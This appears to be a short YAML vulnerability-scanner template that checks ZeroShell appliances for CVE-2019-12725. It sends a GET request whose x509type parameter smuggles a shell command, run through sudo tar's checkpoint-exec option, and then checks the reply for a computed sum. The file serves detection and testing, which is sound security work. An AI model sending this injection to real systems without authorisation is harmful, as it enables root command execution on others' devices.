name: poc-yaml-zeroshell-cve-2019-12725-rce
set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
rules:
  - method: GET
    path: /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A%2Fetc%2Fsudo+tar+-cf+%2Fdev%2Fnull+%2Fdev%2Fnull+--checkpoint%3d1+--checkpoint-action%3dexec%3d%22expr%20{{r1}}%20%2b%20{{r2}}%22%0A%27
    follow_redirects: false
    expression: |
      response.body.bcontains(bytes(string(r1 + r2))) && response.status == 200
detail:
  author: 1au
  links:
    - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12725
